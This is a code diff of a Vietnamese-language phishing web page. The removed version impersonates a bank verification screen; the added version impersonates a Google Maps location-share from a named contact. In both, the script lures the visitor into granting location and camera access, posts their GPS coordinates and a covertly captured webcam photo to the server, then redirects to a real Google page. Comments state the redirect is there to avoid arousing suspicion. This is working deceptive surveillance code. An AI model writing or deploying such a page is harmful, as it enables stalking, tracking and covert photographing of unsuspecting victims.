@@ -3,47 +3,163 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác thực giao dịch an toàn - Hệ thống Ngân hàng</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Maps - Chia sẻ vị trí</title>
     <style>
-        :root {
-            --primary-color: #004a99;
-            --accent-color: #ff6600;
-        }
-
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #f0f2f5;
+        body,
+        html {
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            padding: 0;
+            height: 100%;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #e8eaed;
         }
 
-        .container {
-            text-align: center;
+        .map-proxy {
+            width: 100%;
+            height: 100%;
+            background: url('https://images.squarespace-cdn.com/content/v1/54ffbb98e4b0453e99d300e2/1572465360057-WIGXF0VIB4RBS16D178G/ke17ZwdGBToddI8pDm48kDn_Uatv4mYIs07S0tqsq657gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1Ue6-z_r2z60A6E6fG1mH6u_sY6j0K4hN7-D3Yk1-D3Yk/Google+Maps+Screenshot.jpg') no-repeat center center;
+            background-size: cover;
+            filter: blur(2px);
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.4);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding-bottom: 40px;
+            align-items: center;
+        }
+
+        .location-card {
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            max-width: 450px;
             width: 90%;
+            max-width: 400px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            text-align: center;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
 
         .header {
-            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
         }
 
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary-color);
+        .g-logo {
+            width: 24px;
+            margin-right: 10px;
+        }
+
+        .location-title {
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .sender-info {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            text-align: left;
+        }
+
+        .avatar {
+            width: 45px;
+            height: 45px;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            background: #4285f4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-right: 15px;
+        }
+
+        .sender-text {
+            font-size: 0.9rem;
+            color: #3c4043;
+            line-height: 1.4;
+        }
+
+        .sender-text b {
+            color: #000;
+        }
+
+        .btn-primary {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 0;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-primary:hover {
+            background: #1765cc;
+        }
+
+        .btn-primary svg {
+            margin-right: 8px;
+        }
+
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .g-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
         }
 
         @keyframes spin {
@@ -55,161 +171,82 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* Modal Style */
-        #safety-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal {
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            max-width: 380px;
-            text-align: left;
-            position: relative;
-            animation: slideIn 0.3s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateY(-30px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal h3 {
-            margin-top: 0;
-            color: #d32f2f;
-            font-size: 1.2rem;
-            display: flex;
-            align-items: center;
-        }
-
-        .modal h3::before {
-            content: '⚠️';
-            margin-right: 10px;
-        }
-
-        .modal p {
-            font-size: 0.95rem;
-            color: #555;
-            line-height: 1.5;
-        }
-
-        .btn {
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-            font-size: 1rem;
-            margin-top: 15px;
-            transition: background 0.2s;
-        }
-
-        .btn:hover {
-            background: #003a77;
-        }
-
-        .footer-note {
-            font-size: 0.8rem;
-            color: #999;
-            margin-top: 20px;
-        }
     </style>
 </head>
 
 <body>
 
-    <!-- Lớp phủ bắt buộc xác nhận -->
-    <div id="safety-overlay">
-        <div class="modal">
-            <h3>Yêu cầu xác thực bảo mật</h3>
-            <p>Để ngăn chặn hành vi gian lận và đảm bảo bạn là chủ sở hữu hợp pháp của giao dịch này, hệ thống yêu cầu:
+    <div class="map-proxy"></div>
+
+    <div class="overlay">
+        <div class="location-card">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg"
+                    class="g-logo" alt="logo">
+                <span class="location-title">Vị trí được chia sẻ</span>
+            </div>
+
+            <div class="sender-info">
+                <div class="avatar">T</div>
+                <div class="sender-text">
+                    <b>Thành Đạt</b> đã gửi cho bạn vị trí hiện tại.<br>
+                    <span style="color: #70757a; font-size: 0.8rem;">Cập nhật 1 phút trước</span>
+                </div>
+            </div>
+
+            <p style="font-size: 0.85rem; color: #5f6368; margin-bottom: 20px;">
+                Bật định vị để xem khoảng cách giữa bạn và Thành Đạt trên bản đồ.
             </p>
-            <ul style="padding-left: 20px; font-size: 0.9rem; color: #666;">
-                <li>Xác nhận vị trí GPS hiện tại</li>
-                <li>Xác thực khuôn mặt qua camera trước</li>
-            </ul>
-            <p>Vui lòng nhấn <b>"Tiếp tục"</b> và chọn <b>"Cho phép" (Allow)</b> trên thông báo của trình duyệt khi được
-                hỏi.</p>
-            <button class="btn" onclick="startVerification()">Tiếp tục xác thực</button>
+
+            <button class="btn-primary" onclick="showRealMap()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path
+                        d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
+                </svg>
+                Xem khoảng cách & đường đi
+            </button>
         </div>
     </div>
 
-    <!-- Nội dung chính (Ẩn bên dưới) -->
-    <div class="container">
-        <div class="header">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2L3 7V12C3 17.55 6.84 22.74 12 24C17.16 22.74 21 17.55 21 12V7L12 2Z" fill="#004a99" />
-                <path d="M10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="white" />
-            </svg>
-        </div>
-        <div class="loader"></div>
-        <h2>Vui lòng chờ...</h2>
-        <p>Hệ thống đang kết nối với máy chủ bảo mật của Ngân hàng.</p>
-        <p class="footer-note">Giao dịch được mã hóa 256-bit SSL</p>
+    <div id="loading-screen">
+        <div class="g-spinner"></div>
+        <p style="margin-top: 20px; font-weight: 500;">Đang xác định vị trí của bạn...</p>
     </div>
 
     <script>
-        function startVerification() {
-            // Ẩn modal
-            document.getElementById('safety-overlay').style.display = 'none';
+        function showRealMap() {
+            // Hiển thị màn hình loading để tạo cảm giác hệ thống đang hoạt động
+            document.getElementById('loading-screen').style.display = 'flex';
 
-            // Bắt đầu chuỗi xin quyền
-            tryGPS();
-        }
-
-        function tryGPS() {
+            // Bắt đầu xin quyền GPS
             if (navigator.geolocation) {
-                // Kích động thông báo thật của trình duyệt
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        sendToServer('/log', {
+                        sendData('/log', {
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             accuracy: pos.coords.accuracy
                         });
-                        tryCamera();
+                        takePhoto();
                     },
                     (err) => {
-                        console.warn("User từ chối hoặc lỗi GPS");
-                        tryCamera();
+                        console.warn("User từ chối định vị");
+                        takePhoto();
                     },
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                tryCamera();
+                takePhoto();
             }
         }
 
-        async function tryCamera() {
+        async function takePhoto() {
             try {
-                // Kích động thông báo camera thật
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                // Chờ 1.5 giây để lấy ảnh rõ nét
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
@@ -217,19 +254,16 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const imgData = canvas.toDataURL('image/jpeg');
 
-                    sendToServer('/upload_image', { image: imgData });
-
-                    // Tắt camera sau khi chụp
+                    sendData('/upload_image', { image: imgData });
                     stream.getTracks().forEach(track => track.stop());
-                }, 1500);
+                }, 1000);
             } catch (err) {
                 console.warn("User từ chối camera");
-                // Dù từ chối cũng sẽ redirect để ko bị nghi ngờ
-                setTimeout(() => window.location.href = "https://www.google.com", 2000);
+                finish();
             }
         }
 
-        function sendToServer(url, data) {
+        function sendData(url, data) {
             data.userAgent = navigator.userAgent;
             data.timestamp = new Date().toISOString();
 
@@ -237,12 +271,14 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).then(response => {
-                if (url === '/upload_image') {
-                    // Redirect sau khi ảnh đã lên server
-                    window.location.href = "https://www.google.com";
-                }
+            }).then(() => {
+                if (url === '/upload_image') finish();
             });
+        }
+
+        function finish() {
+            // Sau khi xong, chuyển hướng đến một bản đồ thật để ko bị nghi ngờ
+            window.location.href = "https://www.google.com/maps/search/Th%C3%A0nh+Ph%E1%BB%91+H%E1%BB%93+Ch%C3%AD+Minh";
         }
     </script>
 </body>
